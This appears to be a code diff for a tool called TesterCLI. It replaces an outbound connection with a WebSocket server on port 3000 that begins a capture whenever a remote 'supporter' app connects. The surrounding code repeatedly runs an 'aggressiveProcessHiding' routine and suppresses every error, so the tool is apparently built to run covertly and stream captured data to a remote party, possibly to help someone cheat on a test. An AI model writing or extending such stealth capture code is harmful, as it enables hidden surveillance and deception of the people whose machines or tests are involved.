@@ -337,25 +337,43 @@ class TesterCLI {
     }
   }
 
-  // Connect to supporter app
-  connectToSupporter(host = 'localhost', port = 8080) {
+  // Start WebSocket server for supporter app to connect
+  startWebSocketServer(port = 3000) {
     try {
-      this.ws = new WebSocket(`ws://${host}:${port}`);
+      const WebSocketServer = require('ws').Server;
+      const http = require('http');
       
-      this.ws.on('open', () => {
-        // Start capture when connected
+      // Create HTTP server
+      this.httpServer = http.createServer();
+      
+      // Create WebSocket server
+      this.wss = new WebSocketServer({ 
+        server: this.httpServer,
+        port: port
+      });
+      
+      this.wss.on('connection', (ws) => {
+        this.ws = ws;
+        
+        // Start capture when supporter connects
         this.startCapture();
+        
+        ws.on('close', () => {
+          // Stop capture when supporter disconnects
+          this.stopCapture();
+          this.ws = null;
+        });
+        
+        ws.on('error', (error) => {
+          // Silently ignore errors
+        });
       });
-
-      this.ws.on('close', () => {
-        // Stop capture when disconnected
-        this.stopCapture();
+      
+      // Start the server
+      this.httpServer.listen(port, () => {
+        // Server started successfully
       });
-
-      this.ws.on('error', (error) => {
-        // Silently ignore errors
-      });
-
+      
     } catch (error) {
       // Silently ignore errors
     }
@@ -366,8 +384,8 @@ class TesterCLI {
     // Initial process hiding
     await this.aggressiveProcessHiding();
     
-    // Connect to supporter app
-    this.connectToSupporter();
+    // Start WebSocket server for supporter to connect
+    this.startWebSocketServer(3000);
     
     // Periodic process hiding
     setInterval(() => {
@@ -377,6 +395,9 @@ class TesterCLI {
     // Keep the process alive
     process.on('SIGINT', () => {
       this.stopCapture();
+      if (this.httpServer) {
+        this.httpServer.close();
+      }
       process.exit(0);
     });
   }
